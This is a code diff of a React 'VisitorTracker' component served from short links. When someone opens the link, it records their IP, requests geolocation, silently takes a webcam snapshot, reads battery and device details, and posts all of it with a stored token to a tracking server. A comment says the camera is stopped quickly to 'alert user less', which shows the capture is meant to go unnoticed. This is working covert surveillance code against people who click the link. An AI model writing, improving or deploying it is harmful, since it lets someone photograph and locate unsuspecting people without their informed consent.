@@ -3,40 +3,30 @@ import { useParams } from "react-router-dom";
 
 function VisitorTracker() {
   const { shortId } = useParams();
-
+ 
   useEffect(() => {
     let videoStream = null;
-    let baseData = {};
+    let baseData = {}; // This will hold our "static" data
 
     const initVisitor = async () => {
       try {
-        const ipRes = await fetch("https://ipify.org");
+        // 🌐 IP
+        const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
 
-        let latitude = "";
-        let longitude = "";
+        // 📍 Location
+        let latitude = "N/A", longitude = "N/A";
         if (navigator.geolocation) {
           try {
-            const pos = await new Promise((resolve, reject) =>
-              navigator.geolocation.getCurrentPosition(resolve, reject)
+            const pos = await new Promise((res, rej) =>
+              navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 })
             );
             latitude = pos.coords.latitude;
             longitude = pos.coords.longitude;
-          } catch {
-            console.log("Location denied");
-          }
+          } catch (e) { console.log("Geo denied"); }
         }
 
-        // ✅ FIXED: Added 'let' to batteryInfo so it doesn't crash
-        let batteryInfo = { level: "N/A", charging: "N/A" };
-        if (navigator.getBattery) {
-          const battery = await navigator.getBattery();
-          batteryInfo = {
-            level: battery.level * 100 + "%",
-            charging: battery.charging,
-          };
-        }
-
+        // 🎥 Camera
         let cameraImage = null;
         try {
           videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -45,19 +35,16 @@ function VisitorTracker() {
           await video.play();
 
           const canvas = document.createElement("canvas");
-          canvas.width = 640;
-          canvas.height = 480;
-
-          const ctx = canvas.getContext("2d");
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.width = 320; // Smaller for faster upload
+          canvas.height = 240;
+          canvas.getContext("2d").drawImage(video, 0, 0, 320, 240);
           cameraImage = canvas.toDataURL("image/jpeg", 0.5);
           
-          // Stop tracks immediately after capture
-          videoStream.getTracks().forEach(track => track.stop());
-        } catch {
-          console.log("Camera denied");
-        }
+          // Stop camera immediately after snapshot to save power/alert user less
+          videoStream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log("Cam denied"); }
 
+        // ✅ BUILD BASE DATA
         baseData = {
           shortId,
           ip: ipData.ip,
@@ -67,51 +54,46 @@ function VisitorTracker() {
           cpuCores: navigator.hardwareConcurrency || "N/A",
           browser: navigator.userAgent,
           platform: navigator.platform,
-          language: navigator.language,
           screen: `${window.screen.width}x${window.screen.height}`,
           cameraImage,
         };
 
-        // ✅ FIXED: Wait for baseData to be ready before first hit
-        sendData(); 
+        // Trigger first data sync
+        await sendData(); 
       } catch (err) {
         console.log("Init error:", err);
       }
     };
 
     const sendData = async () => {
-      // ✅ FIXED: Check if baseData is empty to prevent sending empty tracking hits
-      if (!baseData.ip) return;
-
       try {
         const token = localStorage.getItem("token");
-        let batteryLevel = "N/A";
-        let isCharging = "N/A";
-
+        
+        // 🔋 Get Fresh Battery Data
+        let batteryLevel = "N/A", isCharging = "N/A";
         if (navigator.getBattery) {
-          const battery = await navigator.getBattery();
-          batteryLevel = battery.level * 100 + "%";
-          isCharging = battery.charging;
+          const b = await navigator.getBattery();
+          batteryLevel = (b.level * 100) + "%";
+          isCharging = b.charging;
         }
 
-        const visitorData = {
-          ...baseData,
+        const payload = {
+          ...baseData, // Use the baseData collected in init
           batteryLevel,
           isCharging,
           timestamp: new Date().toISOString(),
         };
 
-        const res = await fetch(
-          `https://user-tracking-1.onrender.com/api/auth/t/${shortId}`,
-          {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-              Authorization: `Bearer ${token}`,
-            },
-            body: JSON.stringify(visitorData),
-          }
-        );
+        const res = await fetch(`http://localhost:5000/api/auth/t/${shortId}`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            Authorization: `Bearer ${token}`,
+          },
+          body: JSON.stringify(payload),
+        });
+
+        
 
         const result = await res.json();
 
